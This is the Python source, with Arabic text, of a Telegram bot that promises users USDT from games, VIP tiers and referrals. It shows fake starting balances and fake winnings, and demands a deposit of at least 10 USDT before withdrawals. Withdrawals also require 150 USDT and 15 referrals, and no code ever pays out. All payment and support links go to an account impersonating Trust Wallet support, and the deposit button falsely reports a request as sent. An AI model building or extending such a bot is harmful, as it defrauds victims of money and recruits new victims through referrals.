import os
import telebot
import sqlite3
import random
import threading
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import time
from flask import Flask
import logging

# ✅ تفعيل السجلات
logging.basicConfig(level=logging.INFO)
print("🚀 بدء تشغيل البوت...")

# فحص BOT_TOKEN
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ BOT_TOKEN غير موجود!")
    exit(1)

# تعريف البوت
bot = telebot.TeleBot(BOT_TOKEN)

# 🔐 إعدادات المشرفين
ADMIN_IDS = [8400225549]

def is_admin(user_id):
    return user_id in ADMIN_IDS

# 🗄️ قاعدة البيانات
DB_FILE = 'usdt_bot.db'
db_lock = threading.Lock()

# مستويات VIP
VIP_LEVELS = {
    0: {"name": "🟢 مبتدئ", "daily_bonus": 0.8, "max_attempts": 3, "price": 0},
    1: {"name": "🟢 برونز", "daily_bonus": 1.25, "max_attempts": 5, "price": 5},
    2: {"name": "🔵 سيلفر", "daily_bonus": 1.75, "max_attempts": 8, "price": 10},
    3: {"name": "🟡 جولد", "daily_bonus": 2.75, "max_attempts": 13, "price": 20}
}

def init_database():
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id TEXT PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                balance REAL DEFAULT 0.75,
                referral_count INTEGER DEFAULT 0,
                new_referrals INTEGER DEFAULT 0,
                vip_level INTEGER DEFAULT 0,
                attempts INTEGER DEFAULT 3,
                total_earnings REAL DEFAULT 0.75,
                total_deposits REAL DEFAULT 0.0,
                registration_date TEXT,
                last_activity TEXT,
                last_mining_date TEXT,
                withdrawal_address TEXT,
                games_played_today INTEGER DEFAULT 0,
                last_reset_date TEXT,
                has_deposit INTEGER DEFAULT 0
            )
        """)
        conn.commit()
        conn.close()
        print("✅ تم تهيئة قاعدة البيانات")
        return True
    except Exception as e:
        print(f"❌ خطأ في قاعدة البيانات: {e}")
        return False

def get_user(user_id):
    user_id_str = str(user_id)
    with db_lock:
        try:
            conn = sqlite3.connect(DB_FILE, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id_str,))
            user_data = cursor.fetchone()
            
            if user_data:
                user_dict = {
                    'user_id': user_data[0],
                    'username': user_data[1],
                    'first_name': user_data[2],
                    'balance': user_data[3],
                    'referral_count': user_data[4],
                    'new_referrals': user_data[5],
                    'vip_level': user_data[6],
                    'attempts': user_data[7],
                    'total_earnings': user_data[8],
                    'total_deposits': user_data[9],
                    'registration_date': user_data[10],
                    'last_activity': user_data[11],
                    'last_mining_date': user_data[12],
                    'withdrawal_address': user_data[13],
                    'games_played_today': user_data[14],
                    'last_reset_date': user_data[15],
                    'has_deposit': user_data[16]
                }
                conn.close()
                return user_dict
            else:
                # إنشاء مستخدم جديد
                new_user = {
                    'user_id': user_id_str,
                    'username': "",
                    'first_name': "",
                    'balance': 0.75,
                    'referral_count': 0,
                    'new_referrals': 0,
                    'vip_level': 0,
                    'attempts': 3,
                    'total_earnings': 0.75,
                    'total_deposits': 0.0,
                    'registration_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'last_activity': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'last_mining_date': None,
                    'withdrawal_address': "",
                    'games_played_today': 0,
                    'last_reset_date': datetime.now().strftime('%Y-%m-%d'),
                    'has_deposit': 0
                }
                cursor.execute("""
                    INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    new_user['user_id'], new_user['username'], new_user['first_name'],
                    new_user['balance'], new_user['referral_count'], new_user['new_referrals'],
                    new_user['vip_level'], new_user['attempts'], new_user['total_earnings'],
                    new_user['total_deposits'], new_user['registration_date'],
                    new_user['last_activity'], new_user['last_mining_date'],
                    new_user['withdrawal_address'], new_user['games_played_today'],
                    new_user['last_reset_date'], new_user['has_deposit']
                ))
                conn.commit()
                conn.close()
                return new_user
                
        except Exception as e:
            print(f"❌ خطأ في جلب المستخدم: {e}")
            return None

def update_user(user_id, **kwargs):
    try:
        user = get_user(user_id)
        if not user:
            return False
            
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        set_clause = ", ".join([f"{key} = ?" for key in kwargs.keys()])
        values = list(kwargs.values())
        values.append(user_id)
        
        cursor.execute(f"UPDATE users SET {set_clause} WHERE user_id = ?", values)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"❌ خطأ في تحديث المستخدم: {e}")
        return False

def get_remaining_attempts(user):
    base_attempts = VIP_LEVELS[user['vip_level']]['max_attempts']
    extra_attempts = user.get('new_referrals', 0)
    used_attempts = user.get('games_played_today', 0)
    total_attempts = base_attempts + extra_attempts
    remaining = total_attempts - used_attempts
    return max(0, remaining), total_attempts, extra_attempts

def can_withdraw(user):
    """التحقق من إمكانية السحب"""
    has_10_days = True  # يمكن إضافة شرط الأيام لاحقاً
    has_150_balance = user['balance'] >= 150
    has_address = bool(user.get('withdrawal_address', ''))
    has_15_refs = user.get('new_referrals', 0) >= 15
    has_deposit = user.get('has_deposit', 0) == 1
    
    return has_deposit and has_150_balance and has_address and has_15_refs

# 🎯 الواجهة الرئيسية المحسنة
@bot.message_handler(commands=['start', 'profile', 'الملف'])
def handle_start(message):
    try:
        user_id = message.from_user.id
        print(f"📩 استلام /start من {user_id}")
        
        user_data = get_user(user_id)
        
        # تحديث بيانات المستخدم
        update_user(
            user_id,
            first_name=message.from_user.first_name or "",
            username=message.from_user.username or "",
            last_activity=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        )
        
        remaining_attempts, total_attempts, extra_attempts = get_remaining_attempts(user_data)
        vip_info = VIP_LEVELS[user_data['vip_level']]
        
        profile_text = f"""🎯 **الملف الشخصي**

👤 **المستخدم:** {user_data['first_name'] or 'غير معروف'}
💰 **الرصيد:** {user_data['balance']:.2f} USDT
🏆 **المستوى:** {vip_info['name']}
🎯 **المحاولات:** {remaining_attempts}/{total_attempts}
👥 **الإحالات:** {user_data['referral_count']} مستخدم

💎 **إجمالي الأرباح:** {user_data['total_earnings']:.2f} USDT
📅 **تاريخ التسجيل:** {user_data['registration_date'].split()[0]}"""

        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("🎮 الألعاب", callback_data="games"),
            InlineKeyboardButton("💎 خدمات VIP", callback_data="vip_services")
        )
        keyboard.add(
            InlineKeyboardButton("🎯 رابط الاحالات", callback_data="referral"),
            InlineKeyboardButton("💰 السحب", callback_data="withdraw")
        )
        keyboard.add(
            InlineKeyboardButton("💳 الإيداع", callback_data="deposit"),
            InlineKeyboardButton("🆘 الدعم الفني", url="https://t.me/Trust_wallet_Support_4")
        )
        
        bot.send_message(
            user_id, 
            profile_text,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        print(f"✅ تم الرد على {user_id}")
        
    except Exception as e:
        print(f"❌ خطأ في /start: {e}")

@bot.message_handler(commands=['myid'])
def handle_myid(message):
    try:
        bot.reply_to(message, f"🆔 معرفك: `{message.from_user.id}`", parse_mode='Markdown')
    except Exception as e:
        print(f"❌ خطأ في /myid: {e}")

# 🎮 قائمة الألعاب
@bot.callback_query_handler(func=lambda call: call.data == "games")
def show_games(call):
    try:
        user = get_user(call.from_user.id)
        remaining_attempts, total_attempts, extra_attempts = get_remaining_attempts(user)
        
        games_text = f"""🎮 **قائمة الألعاب**

🎯 **المحاولات المتبقية:** {remaining_attempts}/{total_attempts}
💰 **الربح لكل محاولة:** 2.5 USDT

اختر اللعبة:"""
        
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("🎰 سلوت", callback_data="game_slot"),
            InlineKeyboardButton("🎲 نرد", callback_data="game_dice")
        )
        keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
        
        bot.edit_message_text(
            games_text, 
            call.message.chat.id, 
            call.message.message_id, 
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"❌ خطأ في show_games: {e}")

# 🎰 لعبة السلوت
@bot.callback_query_handler(func=lambda call: call.data == "game_slot")
def play_slot(call):
    try:
        user = get_user(call.from_user.id)
        remaining_attempts, total_attempts, _ = get_remaining_attempts(user)
        
        if remaining_attempts <= 0:
            bot.answer_callback_query(call.id, "❌ لا توجد محاولات متبقية اليوم!", show_alert=True)
            return
        
        update_user(call.from_user.id, games_played_today=user.get('games_played_today', 0) + 1)
        
        symbols = ["🍒", "🍋", "🍊", "🍇", "🔔", "💎"]
        result = [random.choice(symbols) for _ in range(3)]
        
        if result[0] == result[1] == result[2]:
            win_amount = 2.5
            win_text = "🎉 ربح كبير!"
        elif result[0] == result[1] or result[1] == result[2]:
            win_amount = 1.25
            win_text = "👍 ربح جيد!"
        else:
            win_amount = 0
            win_text = "😞 حاول مرة أخرى"
        
        new_balance = user['balance'] + win_amount
        new_earnings = user['total_earnings'] + win_amount
        update_user(call.from_user.id, balance=new_balance, total_earnings=new_earnings)
        
        user = get_user(call.from_user.id)
        remaining_attempts, total_attempts, _ = get_remaining_attempts(user)
        
        game_result = f"""🎰 **لعبة السلوت**

{' | '.join(result)}

{win_text}
💰 **الربح:** {win_amount:.2f} USDT
💵 **الرصيد الجديد:** {new_balance:.2f} USDT

🎯 **المحاولات المتبقية:** {remaining_attempts}/{total_attempts}"""
        
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🎰 العب مرة أخرى", callback_data="game_slot"))
        keyboard.add(InlineKeyboardButton("🔙 رجوع للألعاب", callback_data="games"))
        
        bot.edit_message_text(
            game_result, 
            call.message.chat.id, 
            call.message.message_id, 
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"❌ خطأ في play_slot: {e}")

# 🎲 لعبة النرد - جديدة
@bot.callback_query_handler(func=lambda call: call.data == "game_dice")
def play_dice(call):
    try:
        user = get_user(call.from_user.id)
        remaining_attempts, total_attempts, _ = get_remaining_attempts(user)
        
        if remaining_attempts <= 0:
            bot.answer_callback_query(call.id, "❌ لا توجد محاولات متبقية اليوم!", show_alert=True)
            return
        
        update_user(call.from_user.id, games_played_today=user.get('games_played_today', 0) + 1)
        
        dice1 = random.randint(1, 6)
        dice2 = random.randint(1, 6)
        total = dice1 + dice2
        
        if total == 7:
            win_amount = 2.5
            win_text = "🎉 ربح كبير! (رقم الحظ)"
        elif total >= 10:
            win_amount = 1.5
            win_text = "👍 ربح جيد!"
        elif total <= 4:
            win_amount = 1.0
            win_text = "👌 ربح صغير"
        else:
            win_amount = 0
            win_text = "😞 حاول مرة أخرى"
        
        new_balance = user['balance'] + win_amount
        new_earnings = user['total_earnings'] + win_amount
        update_user(call.from_user.id, balance=new_balance, total_earnings=new_earnings)
        
        user = get_user(call.from_user.id)
        remaining_attempts, total_attempts, _ = get_remaining_attempts(user)
        
        game_result = f"""🎲 **لعبة النرد**

🎲 **النرد:** {dice1} + {dice2} = {total}

{win_text}
💰 **الربح:** {win_amount:.2f} USDT
💵 **الرصيد الجديد:** {new_balance:.2f} USDT

🎯 **المحاولات المتبقية:** {remaining_attempts}/{total_attempts}"""
        
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🎲 العب مرة أخرى", callback_data="game_dice"))
        keyboard.add(InlineKeyboardButton("🔙 رجوع للألعاب", callback_data="games"))
        
        bot.edit_message_text(
            game_result, 
            call.message.chat.id, 
            call.message.message_id, 
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"❌ خطأ في play_dice: {e}")

# 💎 خدمات VIP
@bot.callback_query_handler(func=lambda call: call.data == "vip_services")
def show_vip_services(call):
    try:
        vip_text = """💎 **العضويات VIP المميزة:**

🟢 **برونز VIP - 5 USDT:**
• مكافأة يومية 1.25 USDT
• +2 محاولات ألعاب يومية
• دعم فني متميز

🔵 **سيلفر VIP - 10 USDT:**
• مكافأة يومية 1.75 USDT  
• +5 محاولات ألعاب يومية
• أولوية في معالجة طلبات السحب

🟡 **جولد VIP - 20 USDT:**
• مكافأة يومية 2.75 USDT
• +10 محاولات ألعاب يومية
• أولوية قصوى في جميع الخدمات

اختر العضوية المناسبة:"""
        
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("🟢 شراء برونز VIP - 5 USDT", url="https://t.me/Trust_wallet_Support_4"),
            InlineKeyboardButton("🔵 شراء سيلفر VIP - 10 USDT", url="https://t.me/Trust_wallet_Support_4"),
            InlineKeyboardButton("🟡 شراء جولد VIP - 20 USDT", url="https://t.me/Trust_wallet_Support_4"),
            InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile")
        )
        
        bot.edit_message_text(
            vip_text, 
            call.message.chat.id, 
            call.message.message_id, 
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"❌ خطأ في show_vip_services: {e}")

# 💳 زر الإيداع الجديد
@bot.callback_query_handler(func=lambda call: call.data == "deposit")
def handle_deposit(call):
    try:
        deposit_text = """💳 **نظام الإيداع**

📊 **لماذا تحتاج للإيداع؟**
• تفعيل خاصية السحب
• زيادة فرص الربح
• وصول أسرع للأرباح

💰 **الحد الأدنى للإيداع:** 10 USDT

🚀 **لإجراء الإيداع:**
1. اضغط على زر 'طلب إيداع' أدناه
2. سيتم تحويلك للمسؤول
3. أرسل مبلغ الإيداع
4. سيتم تفعيل حسابك خلال 24 ساعة

✅ **بعد الإيداع ستصبح مؤهلاً ل:**
• سحب الأرباح
• مزايا إضافية
• دعم متميز"""
        
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("📥 طلب إيداع", url="https://t.me/Trust_wallet_Support_4"))
        keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
        
        bot.edit_message_text(
            deposit_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        
        # إرسال رسالة تأكيد للمستخدم
        bot.send_message(
            call.from_user.id,
            "✅ **تم إرسال طلب الإيداع بنجاح!**\n\n"
            "📞 **سيقوم المسؤول بالتواصل معك خلال 24 ساعة**\n"
            "💰 **الحد الأدنى للإيداع: 10 USDT**\n\n"
            "شكراً لثقتك بنا! 🌟",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        print(f"❌ خطأ في handle_deposit: {e}")

# 🎯 رابط الاحالات
@bot.callback_query_handler(func=lambda call: call.data == "referral")
def handle_referral(call):
    try:
        bot_username = bot.get_me().username
        referral_link = f"https://t.me/{bot_username}?start=ref{call.from_user.id}"
        
        referral_text = f"""🎯 **نظام الإحالات**

🔗 **رابط الدعوة الخاص بك:**
`{referral_link}`

👥 **مزايا الإحالات:**
• 🎁 1 USDT مكافأة فورية لكل إحالة
• +1 محاولة ألعاب يومية لكل إحالة  
• فرصة ربح مضاعفة
• وصول أسرع لشروط السحب

📤 **شارك الرابط مع أصدقائك واكسب المزيد!**"""
        
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("📤 مشاركة الرابط", url=f"https://t.me/share/url?url={referral_link}&text=انضم%20إلي%20في%20هذا%20البوت%20الرائع%20واربح%20USDT%20مجاناً!"))
        keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
        
        bot.edit_message_text(
            referral_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"❌ خطأ في handle_referral: {e}")

# 💰 نظام السحب
@bot.callback_query_handler(func=lambda call: call.data == "withdraw")
def handle_withdraw(call):
    try:
        user = get_user(call.from_user.id)
        
        if not user.get('has_deposit', 0):
            withdraw_text = """❌ **غير مؤهل للسحب**

💰 **لتصبح مؤهلاً للسحب، تحتاج إلى:**

1. **إيداع أولي:** 10 USDT كحد أدنى
2. **رصيد في الحساب:** 150 USDT كحد أدنى للسحب  
3. **إحالات جديدة:** 15 إحالة على الأقل
4. **عنوان محفظة:** USDT (TRC20)

💳 **لإجراء الإيداع، اضغط على زر 'الإيداع' في القائمة الرئيسية**"""
            
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("💳 الانتقال للإيداع", callback_data="deposit"))
            keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
        else:
            withdraw_text = f"""💰 **نظام السحب**

✅ **أنت مؤهل للسحب!**

💰 **الرصيد المتاح:** {user['balance']:.1f} USDT
💳 **عنوان المحفظة:** {user['withdrawal_address'] or 'غير محدد'}

📊 **شروط السحب:**
• ✓ إيداع مفعل
• {'✓' if user['balance'] >= 150 else '✗'} رصيد 150 USDT ({user['balance']:.1f}/150)
• {'✓' if user['new_referrals'] >= 15 else '✗'} 15 إحالة جديدة ({user['new_referrals']}/15)
• {'✓' if user['withdrawal_address'] else '✗'} عنوان محفظة محدد

اختر مبلغ السحب:"""
            
            keyboard = InlineKeyboardMarkup(row_width=2)
            if user['balance'] >= 150:
                keyboard.add(
                    InlineKeyboardButton("💰 سحب 150 USDT", callback_data="withdraw_150"),
                    InlineKeyboardButton("💰 سحب 300 USDT", callback_data="withdraw_300"),
                    InlineKeyboardButton("💰 سحب 500 USDT", callback_data="withdraw_500"),
                    InlineKeyboardButton("💰 سحب كل الرصيد", callback_data="withdraw_all")
                )
            keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
        
        bot.edit_message_text(
            withdraw_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"❌ خطأ في handle_withdraw: {e}")

def process_withdrawal_address(message, user):
    try:
        address = message.text.strip()
        if len(address) < 10:
            msg = bot.send_message(
                message.chat.id,
                "❌ عنوان غير صحيح! الرجاء إرسال عنوان محفظة USDT (TRC20) صحيح:"
            )
            bot.register_next_step_handler(msg, process_withdrawal_address, user)
            return
        
        user['withdrawal_address'] = address
        update_user(user['user_id'], withdrawal_address=address)
        handle_withdraw(message)
    except Exception as e:
        print(f"❌ خطأ في process_withdrawal_address: {e}")

# 🔙 رجوع للبروفايل
@bot.callback_query_handler(func=lambda call: call.data == "back_to_profile")
def back_to_profile(call):
    try:
        user = get_user(call.from_user.id)
        remaining_attempts, total_attempts, extra_attempts = get_remaining_attempts(user)
        vip_info = VIP_LEVELS[user['vip_level']]
        
        profile_text = f"""🎯 **الملف الشخصي**

👤 **المستخدم:** {user['first_name'] or 'غير معروف'}
💰 **الرصيد:** {user['balance']:.2f} USDT
🏆 **المستوى:** {vip_info['name']}
🎯 **المحاولات:** {remaining_attempts}/{total_attempts}
👥 **الإحالات:** {user['referral_count']} مستخدم

💎 **إجمالي الأرباح:** {user['total_earnings']:.2f} USDT
📅 **تاريخ التسجيل:** {user['registration_date'].split()[0]}"""

        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("🎮 الألعاب", callback_data="games"),
            InlineKeyboardButton("💎 خدمات VIP", callback_data="vip_services")
        )
        keyboard.add(
            InlineKeyboardButton("🎯 رابط الاحالات", callback_data="referral"),
            InlineKeyboardButton("💰 السحب", callback_data="withdraw")
        )
        keyboard.add(
            InlineKeyboardButton("💳 الإيداع", callback_data="deposit"),
            InlineKeyboardButton("🆘 الدعم الفني", url="https://t.me/Trust_wallet_Support_4")
        )
        
        bot.edit_message_text(
            profile_text, 
            call.message.chat.id, 
            call.message.message_id, 
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"❌ خطأ في back_to_profile: {e}")

# 🛠️ الأوامر الإدارية المحدثة
@bot.message_handler(commands=['quickadd'])
def handle_quickadd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ ليس لديك صلاحية!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(message.chat.id, "📝 usage: /quickadd [user_id] [amount]")
            return
        
        target_user_id = parts[1]
        amount = float(parts[2])
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ المستخدم غير موجود!")
            return
        
        new_balance = user['balance'] + amount
        success = update_user(target_user_id, balance=new_balance)
        
        if success:
            bot.send_message(message.chat.id, f"✅ تم إضافة {amount} USDT للمستخدم {target_user_id}")
        else:
            bot.send_message(message.chat.id, "❌ فشل في إضافة الرصيد!")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ خطأ: {e}")

@bot.message_handler(commands=['setbalance'])
def handle_setbalance(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ ليس لديك صلاحية!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(message.chat.id, "📝 usage: /setbalance [user_id] [amount]")
            return
        
        target_user_id = parts[1]
        amount = float(parts[2])
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ المستخدم غير موجود!")
            return
        
        success = update_user(target_user_id, balance=amount)
        
        if success:
            bot.send_message(message.chat.id, f"✅ تم تعيين رصيد المستخدم {target_user_id} إلى {amount} USDT")
        else:
            bot.send_message(message.chat.id, "❌ فشل في تعيين الرصيد!")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ خطأ: {e}")

# أمر تفعيل الإيداع
@bot.message_handler(commands=['activate_deposit'])
def handle_activate_deposit(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ ليس لديك صلاحية!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(message.chat.id, "📝 usage: /activate_deposit [user_id]")
            return
        
        target_user_id = parts[1]
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ المستخدم غير موجود!")
            return
        
        success = update_user(target_user_id, has_deposit=1)
        
        if success:
            bot.send_message(message.chat.id, f"✅ تم تفعيل الإيداع للمستخدم {target_user_id}")
            # إرسال إشعار للمستخدم
            try:
                bot.send_message(
                    target_user_id,
                    "🎉 **تم تفعيل إيداعك بنجاح!**\n\n"
                    "✅ **أنت الآن مؤهل ل:**\n"
                    "• سحب الأرباح\n"
                    "• مزايا إضافية\n"
                    "• دعم متميز\n\n"
                    "شكراً لثقتك بنا! 🌟",
                    parse_mode='Markdown'
                )
            except:
                pass
        else:
            bot.send_message(message.chat.id, "❌ فشل في تفعيل الإيداع!")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ خطأ: {e}")

# أمر سحب الرصيد
@bot.message_handler(commands=['withdraw_balance'])
def handle_withdraw_balance(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ ليس لديك صلاحية!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(message.chat.id, "📝 usage: /withdraw_balance [user_id] [amount]")
            return
        
        target_user_id = parts[1]
        amount = float(parts[2])
        
        user = get_user(target_user_id)
        if not user:
            bot.send_message(message.chat.id, "❌ المستخدم غير موجود!")
            return
        
        if user['balance'] < amount:
            bot.send_message(message.chat.id, f"❌ رصيد المستخدم غير كافي! الرصيد: {user['balance']:.1f} USDT")
            return
        
        new_balance = user['balance'] - amount
        success = update_user(target_user_id, balance=new_balance)
        
        if success:
            bot.send_message(message.chat.id, f"✅ تم سحب {amount} USDT من المستخدم {target_user_id}")
            # إرسال إشعار للمستخدم
            try:
                bot.send_message(
                    target_user_id,
                    f"💸 **تم سحب رصيد بنجاح!**\n\n"
                    f"💰 **المبلغ المسحوب:** {amount:.1f} USDT\n"
                    f"💵 **الرصيد المتبقي:** {new_balance:.1f} USDT\n"
                    f"📅 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"شكراً لاستخدامك خدماتنا! 🌟",
                    parse_mode='Markdown'
                )
            except:
                pass
        else:
            bot.send_message(message.chat.id, "❌ فشل في سحب الرصيد!")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ خطأ: {e}")

# ... باقي الأوامر الإدارية

# 🔧 نظام التشغيل
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 البوت شغال! أرسل /start للبدء"

@app.route('/health')
def health():
    return "✅ OK", 200

def run_bot():
    print("🔄 بدء تشغيل البوت...")
    
    try:
        bot.delete_webhook()
        time.sleep(5)
    except:
        pass
    
    init_database()
    
    while True:
        try:
            print("🚀 البوت يعمل الآن...")
            bot.infinity_polling(timeout=60, skip_pending=True)
        except Exception as e:
            print(f"❌ خطأ: {e}")
            print("🔄 إعادة التشغيل بعد 10 ثوان...")
            time.sleep(10)

if __name__ == "__main__":
    print("🎯 نظام البوت - الإصدار المحسن")
    
    def run_flask():
        app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
    
    import threading
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    run_bot()
